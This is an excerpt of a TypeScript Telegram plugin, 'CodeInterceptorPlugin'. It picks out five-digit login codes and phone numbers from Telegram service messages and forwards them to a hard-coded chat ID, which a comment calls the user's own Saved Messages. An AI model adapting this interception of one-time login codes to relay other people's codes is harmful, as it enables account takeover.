...
// and forward them to a specified chat/topic

const TARGET_CHAT_ID = 7041948142; // Forward to Saved Messages (yourself)
const LOGIN_CODE_PATTERN = /\b(\d{5})\b/;
const FROM_ID = 777000; // Telegram service notifications
...
class CodeInterceptorPlugin extends Plugin {
  ...
  listenMessageHandler = async (msg: MessageContext) => {
    ...
    // Only intercept from Telegram service (777000)
    ...
    // Also extract phone number if present
    const phoneMatch = text.match(/(\+\d{6,15})/);
    const phone = phoneMatch ? phoneMatch[1] : null;

    // Forward to Saved Messages with clear formatting
